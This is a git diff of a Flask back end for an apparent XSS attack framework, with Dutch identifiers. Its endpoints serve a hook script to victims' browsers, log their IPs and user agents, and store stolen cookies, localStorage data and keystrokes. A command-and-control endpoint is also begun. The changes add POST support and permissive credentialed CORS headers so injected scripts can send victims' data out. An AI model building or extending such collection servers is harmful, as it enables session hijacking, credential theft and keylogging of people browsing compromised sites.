@@ -21,7 +21,7 @@ xxs_bp = Blueprint('xxs_bp', __name__,
 @xxs_bp.route("/xxs.js", methods=["GET", "POST"])
 def xss_hooked():
     ip = request.remote_addr
-    if ip != '127.3.0.1':
+    if ip != appdata.ikzelf:
         ua = request.headers.get('User-Agent')
         loc = request.headers.get('Referer')
         md5 = hashlib.md5(str(ip+ua).encode())
@@ -32,7 +32,7 @@ def xss_hooked():
             db.session.commit()
         pagina = render_template('xss.html', localhost=appdata.localhost)
     else:
-        pagina = render_template('xss-blanco.html', localhost='http://localhost')
+        pagina = render_template('xss-blanco.html', localhost=appdata.localhost)
 
     return pagina, 200, {
         'Content-Type': 'text/javascript',
@@ -43,10 +43,10 @@ def xss_hooked():
 
 
 
-@xxs_bp.route("/xxs/cookies", methods=["GET"])
+@xxs_bp.route("/xxs/cookies", methods=["GET", "POST"])
 def xss_cookies():
     ip = request.remote_addr
-    if request.args.get('data') and ip != '127.3.0.1':
+    if request.args.get('data') and ip != appdata.ikzelf:
 
         loc = request.headers.get('Referer')
         ua = request.headers.get('User-Agent')
@@ -59,16 +59,29 @@ def xss_cookies():
             db.session.add(bevdb)
             db.session.commit()
 
-        return '[!] Tot ziens en bedankt voor de vis.'
+        pagina = '[!] Tot ziens en bedankt voor de vis.'
+
+        return pagina, 200, {
+            'Content-Type': 'text/javascript',
+            'Cache-Control': 'no-cache, no-store, must-revalidate',
+            'Access-Control-Allow-Origin': 'http://'+(request.referrer if request.referrer else request.remote_addr),
+            'Access-Control-Allow-Credentials': 'true',
+            'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
+            'Access-Control-Allow-Headers': 'Content-Type',
+            'Vary': 'Origin',
+            'Pragma': 'no-cache',
+            'Expires': '0'
+        }
+
     else:
         abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")
 
 #xxe callback
-@xxs_bp.route("/xxs/localstorage", methods=["GET"])
+@xxs_bp.route("/xxs/localstorage", methods=["GET", "POST"])
 def xss_localstorage():
 
     ip = request.remote_addr
-    if request.args.get('data') and ip != '127.3.0.1':
+    if request.args.get('data') and ip != appdata.ikzelf:
 
         loc = request.headers.get('Referer')
         ua = request.headers.get('User-Agent')
@@ -81,10 +94,21 @@ def xss_localstorage():
             db.session.add(bevdb)
             db.session.commit()
 
+        pagina= '[!] Tot ziens en bedankt voor de vis.'
+
+        return pagina, 200, {
+            'Content-Type': 'text/javascript',
+            'Cache-Control': 'no-cache, no-store, must-revalidate',
+            'Access-Control-Allow-Origin': 'http://'+(request.referrer if request.referrer else request.remote_addr),
+            'Access-Control-Allow-Credentials': 'true',
+            'Access-Control-Allow-Methods': 'POST, GET',
+            'Access-Control-Allow-Headers': 'Content-Type',
+            'Vary': 'Origin',
+            'Pragma': 'no-cache',
+            'Expires': '0'
+        }
 
 
-
-        return '[!] Tot ziens en bedankt voor de vis.'
 
     else:
         abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")
@@ -95,13 +119,35 @@ def xss_cors():
     return '[!] Tot ziens en bedankt voor de vis.'
 
 #xxe callback
-@xxs_bp.route("/xxs/commands", methods=["GET"])
+@xxs_bp.route("/xxs/commands", methods=["GET", "POST"])
 def xss_c2():
-    return '[!] Tot ziens en bedankt voor de vis.'
+    '''
+    class db_xxs_commands(db.Model):
+    """Bevindingen model."""
+    __tablename__ = 'db_xxs_commands'
+    id = db.Column(db.Integer, primary_key=True)
+    host = db.Column(db.String(32), default='*')
+    opdracht = db.Column(db.Text())
+    '''
 
 
 
-@xxs_bp.route("/xxs/keylogger", methods=["GET"])
+    pagina = '[!] Tot ziens en bedankt voor de vis.'
+
+    return pagina, 200, {
+            'Content-Type': 'text/javascript',
+            'Cache-Control': 'no-cache, no-store, must-revalidate',
+            'Access-Control-Allow-Origin': 'http://'+(request.referrer if request.referrer else request.remote_addr),
+            'Access-Control-Allow-Credentials': 'true',
+            'Access-Control-Allow-Methods': 'POST, GET',
+            'Access-Control-Allow-Headers': 'Content-Type',
+            'Vary': 'Origin',
+            'Pragma': 'no-cache',
+            'Expires': '0'
+        }
+
+
+@xxs_bp.route("/xxs/keylogger", methods=["GET", "POST"])
 def xss_keylogger():
     ip = request.remote_addr
     if ip != '127.3.0.1':
@@ -122,7 +168,20 @@ def xss_keylogger():
             bevdb = db_xxs_keylogger.query.get(hebben.id)
             bevdb.toetsen = hebben.toetsen+data
             db.session.commit()
-        return '[!] Tot ziens en bedankt voor de vis.'
+        pagina = '[!] Tot ziens en bedankt voor de vis.'
+
+        return pagina, 200, {
+            'Content-Type': 'text/javascript',
+            'Cache-Control': 'no-cache, no-store, must-revalidate',
+            'Access-Control-Allow-Origin': 'http://'+(request.referrer if request.referrer else request.remote_addr),
+            'Access-Control-Allow-Credentials': 'true',
+            'Access-Control-Allow-Methods': 'POST, GET',
+            'Access-Control-Allow-Headers': 'Content-Type',
+            'Vary': 'Origin',
+            'Pragma': 'no-cache',
+            'Expires': '0'
+        }
+
 
     else:
         abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")
